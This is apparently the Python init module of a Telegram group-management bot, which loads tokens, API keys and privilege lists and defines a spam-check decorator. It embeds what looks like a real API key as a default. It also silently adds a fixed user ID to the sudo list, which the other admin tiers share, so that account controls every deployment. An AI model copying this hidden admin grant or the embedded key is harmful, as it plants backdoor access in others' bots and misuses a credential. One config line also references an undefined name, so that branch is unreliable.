import logging
import os
import sys
import time
from datetime import datetime
from functools import wraps
from telethon import TelegramClient
import telegram.ext as tg

# enable logging
logging.basicConfig(
	format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
	level=logging.INFO)

LOGGER = logging.getLogger(__name__)

# if version < 3.6, stop bot.
if sys.version_info[0] < 3 or sys.version_info[1] < 6:
	LOGGER.error("You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting.")
	quit(1)

# Check if system is reboot or not
try:
	os.remove("reboot")
except:
	pass

ENV = bool(os.environ.get('ENV', False))

if ENV:
	TOKEN = os.environ.get('TOKEN', None)
	try:
		OWNER_ID = int(os.environ.get('OWNER_ID', None))
	except ValueError:
		raise Exception("Your OWNER_ID env variable is not a valid integer.")

	MESSAGE_DUMP = os.environ.get('MESSAGE_DUMP', None)
	OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)
	IS_DEBUG = os.environ.get("IS_DEBUG", False)

	try:
		SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
	except ValueError:
		raise Exception("Your sudo users list does not contain valid integers.")

	try:
		SUPPORT_USERS = set(int(x) for x in os.environ.get("SUPPORT_USERS", "").split())
	except ValueError:
		raise Exception("Your support users list does not contain valid integers.")

	try:
		SPAMMERS = set(int(x) for x in os.environ.get("SPAMMERS", "").split())
	except ValueError:
		raise Exception("Your spammers users list does not contain valid integers.")

	try:
		GROUP_BLACKLIST = set(int(x) for x in os.environ.get("GROUP_BLACKLIST", "").split())
	except ValueError:
		raise Exception("Your GROUP_BLACKLIST users list does not contain valid integers.")

	try:
		WHITELIST_USERS = set(int(x) for x in os.environ.get("WHITELIST_USERS", "").split())
	except ValueError:
		raise Exception("Your whitelisted users list does not contain valid integers.")

	WEBHOOK = bool(os.environ.get('WEBHOOK', False))
	URL = os.environ.get('URL', "")  # Does not contain token
	PORT = int(os.environ.get('PORT', 5000))
	CERT_PATH = os.environ.get("CERT_PATH")
	TELETHON_HASH = os.environ.get('TL_HASH', None)
	DB_URI = os.environ.get('DATABASE_URL')
	DONATION_LINK = os.environ.get('DONATION_LINK')
	LOAD = os.environ.get("LOAD", "").split()
	NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
	DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
	STRICT_GBAN = bool(os.environ.get('STRICT_GBAN', False))
	WORKERS = int(os.environ.get('WORKERS', 8))
	TELETHON_ID = int(os.environ.get('TL_APP_ID', None))
	BAN_STICKER = os.environ.get('BAN_STICKER', 'CAACAgUAAxkBAAIFsF_DODyEEGgFkQT9LhF86Yfx3ilNAAMBAALhGEhVjC5-oPs8-A4eBA')
	# ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
	CUSTOM_CMD = os.environ.get('CUSTOM_CMD', False)
	API_WEATHER = os.environ.get('API_OPENWEATHER', None)
	AI_API_KEY = os.environ.get('AI_API_KEY', '61a59c94b42c9b703b091fd419860eb118504bf6918534ed3b9a5fca50411f7534389749bb8cbeeb3ab7906c2703f52fe81fc02949fe8893b67c9c88e3fa76d3')
	API_ACCUWEATHER = os.environ.get('API_ACCUWEATHER', None)
	DAISY_IMG = os.environ.get('DAISY_IMG', 'https://telegra.ph/file/4be7c7a8a1a9f50b73d21.jpg')
	MAPS_API = os.environ.get('MAPS_API', None)	       
	TEMPORARY_DATA = os.environ.get('TEMPORARY_DATA', None)
	SPAMWATCH_TOKEN = os.environ.get('SPAMWATCH_TOKEN', None)
	WALL_API = os.environ.get('WALL_API', None)
	CASH_API_KEY = os.environ.get('CASH_API_KEY', None)
	TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
	TIME_API_KEY = os.environ.get('TIME_API_KEY', None)
	
    	
	LASTFM_API_KEY = os.environ.get('LASTFM_API_KEY', None)

else:
	from emilia.config import Development as Config
	TOKEN = Config.API_KEY
	try:
		OWNER_ID = int(Config.OWNER_ID)
	except ValueError:
		raise Exception("Your OWNER_ID variable is not a valid integer.")

	MESSAGE_DUMP = Config.MESSAGE_DUMP
	OWNER_USERNAME = Config.OWNER_USERNAME
	try:
		IS_DEBUG = Config.IS_DEBUG
	except AttributeError:
		IS_DEBUG = False

	try:
		SUDO_USERS = set(int(x) for x in Config.SUDO_USERS or [])
	except ValueError:
		raise Exception("Your sudo users list does not contain valid integers.")

	try:
		SUPPORT_USERS = set(int(x) for x in Config.SUPPORT_USERS or [])
	except ValueError:
		raise Exception("Your support users list does not contain valid integers.")

	try:
		SPAMMERS = set(int(x) for x in Config.SPAMMERS or [])
	except ValueError:
		raise Exception("Your spammers users list does not contain valid integers.")

	try:
		GROUP_BLACKLIST = set(int(x) for x in Config.GROUP_BLACKLIST or [])
	except ValueError:
		raise Exception("Your GROUP_BLACKLIST users list does not contain valid integers.")

	try:
		WHITELIST_USERS = set(int(x) for x in Config.WHITELIST_USERS or [])
	except ValueError:
		raise Exception("Your whitelisted users list does not contain valid integers.")

	WEBHOOK = Config.WEBHOOK
	URL = Config.URL
	PORT = Config.PORT
	CERT_PATH = Config.CERT_PATH
	TELETHON_ID = int(Config.TL_APP_ID)
	DB_URI = Config.SQLALCHEMY_DATABASE_URI
	TELETHON_HASH = Config.TL_HASH
	DONATION_LINK = Config.DONATION_LINK
	LOAD = Config.LOAD
	NO_LOAD = Config.NO_LOAD
	DEL_CMDS = Config.DEL_CMDS
	STRICT_GBAN = Config.STRICT_GBAN
	WORKERS = Config.WORKERS
	BAN_STICKER = Config.BAN_STICKER
	# ALLOW_EXCL = Config.ALLOW_EXCL
	CUSTOM_CMD = Config.CUSTOM_CMD
	API_WEATHER = Config.API_OPENWEATHER
	API_ACCUWEATHER = Config.API_ACCUWEATHER
	MAPS_API = Config.MAPS_API
	TEMPORARY_DATA = Config.TEMPORARY_DATA
	WALL_API = config.WALL_API
	try:
		SPAMWATCH_TOKEN = Config.SPAMWATCH_TOKEN
	except:
		pass


SUDO_USERS.add(OWNER_ID)
SUDO_USERS.add(1141839926)

updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
api_id = TELETHON_ID
api_hash = TELETHON_HASH
client = TelegramClient("emilia", api_id, api_hash)
dispatcher = updater.dispatcher


SUDO_USERS = list(SUDO_USERS)
WHITELIST_USERS = list(WHITELIST_USERS)
SUPPORT_USERS = list(SUPPORT_USERS)
SPAMMERS = list(SPAMMERS)
GROUP_BLACKLIST = list(GROUP_BLACKLIST)
DEV_USERS = SUDO_USERS
DRAGONS = SUDO_USERS
DEMONS = SUDO_USERS
TIGERS = SUDO_USERS
WOLVES = SUDO_USERS
# Load at end to ensure all prev variables have been set
from emilia.modules.helper_funcs.handlers import CustomCommandHandler

if CUSTOM_CMD and len(CUSTOM_CMD) >= 1:
	tg.CommandHandler = CustomCommandHandler

try:
	from emilia.antispam import antispam_restrict_user, antispam_cek_user, detect_user
	LOGGER.info("Note: AntiSpam loaded!")
	antispam_module = True
except ModuleNotFoundError:
	antispam_module = False


def spamcheck(func):
	@wraps(func)
	def check_user(update, context, *args, **kwargs):
		chat = update.effective_chat
		user = update.effective_user
		message = update.effective_message
		# If not user, return function
		if not user:
			return func(update, context, *args, **kwargs)
		# If msg from self, return True
		if user and user.id == context.bot.id:
			return False
		if IS_DEBUG:
			print("{} | {} | {} | {}".format(message.text or message.caption, user.id, message.chat.title, chat.id))
		if antispam_module:
			parsing_date = time.mktime(message.date.timetuple())
			detecting = detect_user(user.id, chat.id, message, parsing_date)
			if detecting:
				return False
			antispam_restrict_user(user.id, parsing_date)
		if int(user.id) in SPAMMERS:
			if IS_DEBUG:
				print("^ This user is spammer!")
			return False
		elif int(chat.id) in GROUP_BLACKLIST:
			dispatcher.bot.sendMessage(chat.id, "This group is in blacklist, i'm leave...")
			dispatcher.bot.leaveChat(chat.id)
			return False
		return func(update, context, *args, **kwargs)

	return check_user

